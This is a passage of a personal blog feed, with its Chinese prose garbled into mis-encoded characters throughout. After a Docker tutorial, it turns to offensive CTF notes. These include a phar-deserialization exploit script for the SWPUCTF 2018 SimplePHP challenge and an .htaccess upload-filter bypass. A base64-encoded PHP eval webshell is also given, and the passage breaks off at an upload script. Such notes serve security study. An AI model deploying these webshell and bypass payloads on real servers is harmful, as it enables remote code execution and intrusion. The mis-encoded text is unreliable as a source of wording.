        <content type="html"><![CDATA[<h1 id="dockerå­¦ä¹ "><a href="#dockerå­¦ä¹ " class="headerlink" title="dockerå­¦ä¹ "></a>dockerå­¦ä¹ </h1><h2 id="dockerfileå¯åŠ¨ç¯å¢ƒ"><a href="#dockerfileå¯åŠ¨ç¯å¢ƒ" class="headerlink" title="dockerfileå¯åŠ¨ç¯å¢ƒ"></a>dockerfileå¯åŠ¨ç¯å¢ƒ</h2><p>äº‹å…ˆç¼–å†™å¥½dockerfileï¼Œåœ¨å…¶æ‰€åœ¨ç›®å½•ä¸‹æ‰“å¼€ç»ˆç«¯ï¼Œä»dockerfileå»ºç«‹é•œåƒ</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">docker <span class="hljs-keyword">build </span>-t nginx:<span class="hljs-built_in">v1</span> . <br></code></pre></td></tr></table></figure><blockquote><p>-t snginx:v1 ç»™æ–°æ„å»ºçš„é•œåƒå–åä¸ºnginxï¼Œå¹¶è®¾å®šç‰ˆæœ¬ä¸º v1 ã€‚</p><p>âš ï¸ä¸è¦å¿˜è®°ç‰ˆæœ¬å·åç©ºæ ¼åŠ ä¸€ä¸ª<code>.</code> æœ€åçš„<code>.</code>ä»£è¡¨æœ¬æ¬¡æ‰§è¡Œçš„ä¸Šä¸‹æ–‡è·¯å¾„</p><p>ä¸Šä¸‹æ–‡è·¯å¾„:æ˜¯æŒ‡ docker åœ¨æ„å»ºé•œåƒï¼Œæœ‰æ—¶å€™æƒ³è¦ä½¿ç”¨åˆ°æœ¬æœºçš„æ–‡ä»¶ï¼ˆæ¯”å¦‚å¤åˆ¶ï¼‰ï¼Œdocker build å‘½ä»¤å¾—çŸ¥è¿™ä¸ªè·¯å¾„åï¼Œä¼šå°†è·¯å¾„ä¸‹çš„æ‰€æœ‰å†…å®¹æ‰“åŒ…ã€‚é»˜è®¤ä¸Šä¸‹æ–‡è·¯å¾„å°±æ˜¯ Dockerfile æ‰€åœ¨çš„ä½ç½®a</p><p>âš ï¸ä¸Šä¸‹æ–‡è·¯å¾„ä¸‹ä¸è¦æ”¾æ— ç”¨çš„æ–‡ä»¶ï¼Œå› ä¸ºä¼šä¸€èµ·æ‰“åŒ…å‘é€ç»™ docker å¼•æ“ï¼Œå¦‚æœæ–‡ä»¶è¿‡å¤šä¼šé€ æˆè¿‡ç¨‹ç¼“æ…¢ã€‚</p></blockquote><p>ä½¿ç”¨<code>docker images</code>å‘½ä»¤æŸ¥çœ‹é•œåƒæ˜¯å¦åˆ›å»ºæˆåŠŸï¼Œè‹¥æˆåŠŸä¼šå‘ç°æœ‰ä¸€ä¸ªåˆšåˆ›å»ºçš„nginxé•œåƒ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">REPOSITORY</span>    TAG   IMAGE ID       CREATED        SIZE<br><span class="hljs-attribute">nginx</span>         v1   <span class="hljs-number">3</span>efd9464e2a0   <span class="hljs-number">2</span> hours ago    <span class="hljs-number">134</span>MB<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨è¯¥é•œåƒå¯åŠ¨å®¹å™¨ï¼Œæ³¨æ„ç«¯å£æ˜ å°„</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -p æœ¬åœ°ç«¯å£ï¼šå®¹å™¨ç«¯å£ é•œåƒåç§°<br>docker <span class="hljs-built_in">run</span>  --name docker_nginx_v1   -d -p 127.0.0.1:5001:80 nginx:v1<br></code></pre></td></tr></table></figure><blockquote><p>æ„æ€æ˜¯å¯åŠ¨ä¸€ä¸ªåå­—ä¸ºdocker_nginx_v1çš„å®¹å™¨ï¼Œä½¿ç”¨nginx:v1é•œåƒï¼Œå¹¶å°†æœ¬æœº127.0.0.1:5001æ˜ å°„åˆ°è¯¥å®¹å™¨çš„80ç«¯å£(å› ä¸ºnginxçš„é»˜è®¤ç«¯å£æ˜¯<strong>80</strong>)ï¼Œå› æ­¤å»ºç«‹æˆåŠŸåå¯ä»¥ä»127.0.0.1:5001è®¿é—®è¯¥ç¯å¢ƒ</p><p>æ³¨ï¼š</p><p>1.å®¹å™¨é»˜è®¤éƒ½æ˜¯ç»‘å®š tcp ç«¯å£ï¼Œå¦‚æœè¦ç»‘å®š UDP ç«¯å£ï¼Œå¯ä»¥åœ¨å®¹å™¨çš„ç«¯å£åé¢åŠ ä¸Š &#x2F;udp</p><p>2.-d:åœ¨åå°è¿è¡Œ</p><p>3.-it:äº¤äº’å¼æ–¹å¼è¿è¡Œ</p><p>4.-p:æŒ‡å®šç«¯å£</p></blockquote><p><code>docker ps</code>æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CONTAINER</span> ID   IMAGE      COMMAND                  CREATED         STATUS         PORTS                    NAMES<br><span class="hljs-attribute">dd0c50ae3ef8</span>   nginx:v1   <span class="hljs-string">&quot;/docker-entrypoint.â€¦&quot;</span>   <span class="hljs-number">4</span> seconds ago   Up <span class="hljs-number">3</span> seconds   <span class="hljs-number">127.0.0.1:5001</span>-&gt;<span class="hljs-number">80</span>/tcp   docker_nginx_v1<br></code></pre></td></tr></table></figure><p>è®¿é—®127.0.0.1:5001</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1t4bxp031j20zk06u0t8.jpg" alt="image-20220501191611894"></p><p>dockerfileçš„å†…å®¹</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> nginx<br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27;</span> &gt; /usr/share/nginx/html/index.html</span><br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨dockerfileæ„å»ºé•œåƒ"><a href="#ä½¿ç”¨dockerfileæ„å»ºé•œåƒ" class="headerlink" title="ä½¿ç”¨dockerfileæ„å»ºé•œåƒ"></a>ä½¿ç”¨dockerfileæ„å»ºé•œåƒ</h2><p>Dockerfileæ•´ä½“å°±ä¸¤ç±»è¯­å¥ç»„æˆï¼š</p><ul><li># Comment æ³¨é‡Šä¿¡æ¯</li><li>Instruction arguments æŒ‡ä»¤ å‚æ•°ï¼Œä¸€è¡Œä¸€ä¸ªæŒ‡ä»¤ã€‚</li></ul><p>âš ï¸</p><ol><li>Dockerfileæ–‡ä»¶å<strong>é¦–å­—æ¯å¿…é¡»å¤§å†™</strong>ã€‚</li><li>DockerfileæŒ‡ä»¤ä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†æ˜¯ä¸ºæ–¹ä¾¿å’Œå‚æ•°åšåŒºåˆ†ï¼Œé€šå¸¸<strong>æŒ‡ä»¤ä½¿ç”¨å¤§å†™å­—æ¯ã€‚</strong></li><li>Dockerfileä¸­æŒ‡ä»¤æŒ‰é¡ºåºä»ä¸Šè‡³ä¸‹ä¾æ¬¡æ‰§è¡Œã€‚</li><li>Dockerfileä¸­ç¬¬ä¸€ä¸ªéæ³¨é‡Šè¡Œå¿…é¡»æ˜¯<strong>FROMæŒ‡ä»¤</strong>ï¼Œç”¨æ¥æŒ‡å®šåˆ¶ä½œå½“å‰é•œåƒä¾æ®çš„æ˜¯å“ªä¸ªåŸºç¡€é•œåƒã€‚</li><li>Dockerfileä¸­éœ€è¦è°ƒç”¨çš„æ–‡ä»¶å¿…é¡»è·ŸDockerfileæ–‡ä»¶åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œæˆ–è€…åœ¨å…¶å­ç›®å½•ä¸‹ï¼Œçˆ¶ç›®å½•æˆ–è€…å…¶å®ƒè·¯å¾„æ— æ•ˆã€‚</li></ol><h3 id="FROMå’ŒRUN"><a href="#FROMå’ŒRUN" class="headerlink" title="FROMå’ŒRUN"></a>FROMå’ŒRUN</h3><p><strong>FROM</strong>ï¼šå®šåˆ¶çš„é•œåƒéƒ½æ˜¯åŸºäº FROM çš„é•œåƒï¼Œè¿™é‡Œçš„ nginx å°±æ˜¯å®šåˆ¶éœ€è¦çš„åŸºç¡€é•œåƒã€‚åç»­çš„æ“ä½œéƒ½æ˜¯åŸºäº nginxã€‚</p><p><strong>RUN</strong>ï¼šç”¨äºæ‰§è¡Œåé¢è·Ÿç€çš„å‘½ä»¤è¡Œå‘½ä»¤ã€‚æœ‰ä»¥ä¸‹ä¿©ç§æ ¼å¼ï¼š</p><p>shellæ ¼å¼</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> &lt;å‘½ä»¤è¡Œå‘½ä»¤&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>&lt;å‘½ä»¤è¡Œå‘½ä»¤&gt; ç­‰åŒäºï¼Œåœ¨ç»ˆç«¯æ“ä½œçš„ shell å‘½ä»¤ã€‚</p></blockquote><p>execæ ¼å¼</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> [<span class="hljs-string">&quot;å¯æ‰§è¡Œæ–‡ä»¶&quot;</span>, <span class="hljs-string">&quot;å‚æ•°1&quot;</span>, <span class="hljs-string">&quot;å‚æ•°2&quot;</span>]</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> [<span class="hljs-string">&quot;./test.php&quot;</span>, <span class="hljs-string">&quot;dev&quot;</span>, <span class="hljs-string">&quot;offline&quot;</span>] </span><br><span class="hljs-comment"># ç­‰ä»·äº RUN ./test.php dev offline</span><br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœæœ‰å¤šæ¡å‘½ä»¤æ‰§è¡Œï¼Œä¸è¦åˆ†æˆå¤šä¸ªRUNè¯­å¥ï¼Œdockerfileçš„æŒ‡ä»¤æ¯æ‰§è¡Œä¸€æ¬¡éƒ½ä¼šåœ¨ docker ä¸Šæ–°å»ºä¸€å±‚ï¼Œè¿‡å¤šæ— æ„ä¹‰çš„å±‚ï¼Œä¼šé€ æˆé•œåƒè†¨èƒ€è¿‡å¤§</p><p>æ­£ç¡®å†™æ³•æ˜¯ç”¨<code>\</code>è¡¨ç¤ºåˆ†è¡Œï¼Œ<code>&amp;&amp;</code>é“¾æ¥å‘½ä»¤</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">RUN</span><span class="language-bash"> yum -y install wget \</span><br><span class="language-bash"> &amp;&amp; wget -O redis.tar.gz <span class="hljs-string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span><br><span class="language-bash"> &amp;&amp; tar -xvf redis.tar.gz</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>å¤åˆ¶æŒ‡ä»¤ï¼Œå¯ä»¥ä»ä¸Šä¸‹æ–‡ç›®å½•ä¸­å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•åˆ°å®¹å™¨å†…æŒ‡å®šè·¯å¾„</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bnf">COPY [--chown=<span class="hljs-attribute">&lt;user&gt;</span>:<span class="hljs-attribute">&lt;group&gt;</span>] <span class="hljs-attribute">&lt;æºè·¯å¾„1&gt;</span>...  <span class="hljs-attribute">&lt;ç›®æ ‡è·¯å¾„&gt;</span><br>COPY [--chown=<span class="hljs-attribute">&lt;user&gt;</span>:<span class="hljs-attribute">&lt;group&gt;</span>] [&quot;<span class="hljs-attribute">&lt;æºè·¯å¾„1&gt;</span>&quot;,...  &quot;<span class="hljs-attribute">&lt;ç›®æ ‡è·¯å¾„&gt;</span>&quot;]<br></code></pre></td></tr></table></figure><ul><li><p>**[â€“chown&#x3D;<user>:<group>]**ï¼šå¯é€‰å‚æ•°ï¼Œç”¨æˆ·æ”¹å˜å¤åˆ¶åˆ°å®¹å™¨å†…æ–‡ä»¶çš„æ‹¥æœ‰è€…å’Œå±ç»„</p></li><li><p>**&lt;æºè·¯å¾„&gt;**ï¼šæºæ–‡ä»¶æˆ–è€…æºç›®å½•ï¼Œè¿™é‡Œå¯ä»¥æ˜¯é€šé…ç¬¦è¡¨è¾¾å¼ï¼Œå…¶é€šé…ç¬¦è§„åˆ™è¦æ»¡è¶³ Go çš„ filepath.Match è§„åˆ™</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">pattern:<br>&#123; term &#125;<br>term:<br><span class="hljs-string">&#x27;*&#x27;</span>                                  åŒ¹é…<span class="hljs-number">0</span>æˆ–å¤šä¸ªéè·¯å¾„åˆ†éš”ç¬¦çš„å­—ç¬¦<br><span class="hljs-string">&#x27;?&#x27;</span>                                  åŒ¹é…<span class="hljs-number">1</span>ä¸ªéè·¯å¾„åˆ†éš”ç¬¦çš„å­—ç¬¦<br><span class="hljs-string">&#x27;[&#x27;</span> [ <span class="hljs-string">&#x27;^&#x27;</span> ] &#123; character-<span class="hljs-built_in">range</span> &#125; <span class="hljs-string">&#x27;]&#x27;</span>  å­—ç¬¦ç»„ï¼ˆå¿…é¡»éç©ºï¼‰<br><span class="hljs-keyword">c</span>                                    åŒ¹é…å­—ç¬¦<span class="hljs-keyword">c</span>ï¼ˆ<span class="hljs-keyword">c</span> != <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>ï¼‰<br><span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">c</span>                               åŒ¹é…å­—ç¬¦<span class="hljs-keyword">c</span><br>character-<span class="hljs-built_in">range</span>:<br><span class="hljs-keyword">c</span>           åŒ¹é…å­—ç¬¦<span class="hljs-keyword">c</span>ï¼ˆ<span class="hljs-keyword">c</span> != <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>ï¼‰<br><span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">c</span>      åŒ¹é…å­—ç¬¦<span class="hljs-keyword">c</span><br><span class="hljs-keyword">lo</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">hi</span>   åŒ¹é…åŒºé—´[<span class="hljs-keyword">lo</span>, <span class="hljs-keyword">hi</span>]å†…çš„å­—ç¬¦<br><br></code></pre></td></tr></table></figure></li><li><p>**&lt;ç›®æ ‡è·¯å¾„&gt;**ï¼šå®¹å™¨å†…çš„æŒ‡å®šè·¯å¾„ï¼Œè¯¥è·¯å¾„ä¸ç”¨äº‹å…ˆå»ºå¥½ï¼Œ<u>è·¯å¾„ä¸å­˜åœ¨çš„è¯ï¼Œä¼šè‡ªåŠ¨åˆ›å»º</u>ã€‚</p></li></ul><h2 id="é•œåƒæºæ‹‰å–è¶…æ—¶é—®é¢˜"><a href="#é•œåƒæºæ‹‰å–è¶…æ—¶é—®é¢˜" class="headerlink" title="é•œåƒæºæ‹‰å–è¶…æ—¶é—®é¢˜"></a>é•œåƒæºæ‹‰å–è¶…æ—¶é—®é¢˜</h2><p>å°†dockerfileä¸­çš„</p><p><a href="http://link.zhihu.com/?target=http://k8s.gcr.io">k8s.gcr.io</a> â€”&gt; lank8s.cn<br><a href="http://link.zhihu.com/?target=http://gcr.io">gcr.io</a> â€“&gt; gcr.lank8s.cn</p>]]></content>
      
      
      <categories>
          
          <category> utils </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pharååºåˆ—åŒ–</title>
      <link href="/2021/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h1><h3 id="pharæ–‡ä»¶ç»“æ„"><a href="#pharæ–‡ä»¶ç»“æ„" class="headerlink" title="pharæ–‡ä»¶ç»“æ„"></a>pharæ–‡ä»¶ç»“æ„</h3><p>1.a stub<br>    å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸ºxxx<?php xxx; __HALT_COMPILER();?>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶<br>2.a manifest describing the contents<br>    pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹<br>3.the file contentsâ€”è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹<br>4.[optional] a signature for verifying Phar integrity (phar file format only)â€”ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾</p><h3 id="ç”Ÿæˆpharæ–‡ä»¶"><a href="#ç”Ÿæˆpharæ–‡ä»¶" class="headerlink" title="ç”Ÿæˆpharæ–‡ä»¶"></a>ç”Ÿæˆpharæ–‡ä»¶</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//åç¼€åå¿…é¡»ä¸ºphar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//è®¾ç½®stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br>    <span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>ä¼šåœ¨åŒç›®å½•ç”Ÿæˆ phar.phar æ–‡ä»¶</p><p>æ³¨æ„ï¼šè¦æƒ³ç”Ÿæˆpharæ–‡ä»¶ï¼Œå¿…é¡»å°†phar.readonlyé…ç½®é¡¹é…ç½®ä¸º0æˆ–Off,å¹¶ä¸”åˆ é™¤è¡Œé¦–åˆ†å·ï¼Œåœ¨è¡Œå°¾åŠ . å¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶</p></blockquote><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>meta-dataæ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„</p><p>phpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œ<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">ååºåˆ—åŒ–</a>ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221511.jpg" alt="image-20211018194419673"></p><h3 id="SWPUCTF-2018-SimplePHP-EXP"><a href="#SWPUCTF-2018-SimplePHP-EXP" class="headerlink" title="[SWPUCTF 2018]SimplePHP EXP"></a>[SWPUCTF 2018]SimplePHP EXP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;params=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;var/www/html/f1ag.php&#x27;</span>);<span class="hljs-comment">//flagæ‰€åœ¨è·¯å¾„</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<span class="hljs-comment">//ä¸ºäº†ä¸å­˜åœ¨çš„è°ƒç”¨è§¦å‘__get()</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-variable">$b</span>;<span class="hljs-comment">//è§¦å‘__toString()</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>(); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//è®¾ç½®stubï¼Œå¢åŠ å›¾ç‰‡ç±»å‹æ–‡ä»¶å¤´</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//meta-dataå‚¨å­˜çš„ä¿¡æ¯</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//ç”Ÿæˆç­¾å</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><blockquote><p>è¦æƒ³ç”Ÿæˆpharæ–‡ä»¶ï¼Œå¿…é¡»å°†php.iniä¸­phar.readonlyé…ç½®é¡¹é…ç½®ä¸º0æˆ–Off,å¹¶ä¸”åˆ é™¤è¡Œé¦–åˆ†å·ï¼Œåœ¨è¡Œå°¾åŠ .</p><p>ç”Ÿæˆçš„pharä¸­metada.binå†…å®¹ä¸ºç±»åºåˆ—åŒ–åçš„å†…å®¹</p></blockquote><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><h3 id="ç»•è¿‡-lt-è¿‡æ»¤"><a href="#ç»•è¿‡-lt-è¿‡æ»¤" class="headerlink" title="ç»•è¿‡&lt;?è¿‡æ»¤"></a>ç»•è¿‡&lt;?è¿‡æ»¤</h3><p>.htaccessç»•è¿‡æ–‡ä»¶å¤´æ£€æŸ¥</p><p>å¦‚æœç”¨ä¸€èˆ¬çš„<code>GIF89a</code>æ–‡ä»¶å¤´ç»•è¿‡ï¼Œä¼šå¯¼è‡´htaccessæ–‡ä»¶æ— æ³•æ‰§è¡Œï¼Œå› æ­¤è¿™é‡Œç”¨å®šä¹‰é«˜åº¦ä¸å®½åº¦ï¼Œ#åœ¨htaccessä¸­è¢«è§†ä¸ºæ³¨é‡Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">#define width 1337<br>#define height 1337<br>AddType application/x-httpd-php .a<br>php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;<br></code></pre></td></tr></table></figure><p>shell.aå†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a11<br>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==<br></code></pre></td></tr></table></figure><blockquote><p>æ–‡ä»¶å¤´ååŠ çš„å†…å®¹æ˜¯ä¸ºäº†è¡¥è¶³8ä¸ªå­—èŠ‚ï¼Œæ»¡è¶³base64ç¼–ç è§„åˆ™</p></blockquote><h3 id="æ–‡ä»¶ä¸Šä¼ pythonè„šæœ¬"><a href="#æ–‡ä»¶ä¸Šä¼ pythonè„šæœ¬" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ pythonè„šæœ¬"></a>æ–‡ä»¶ä¸Šä¼ pythonè„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 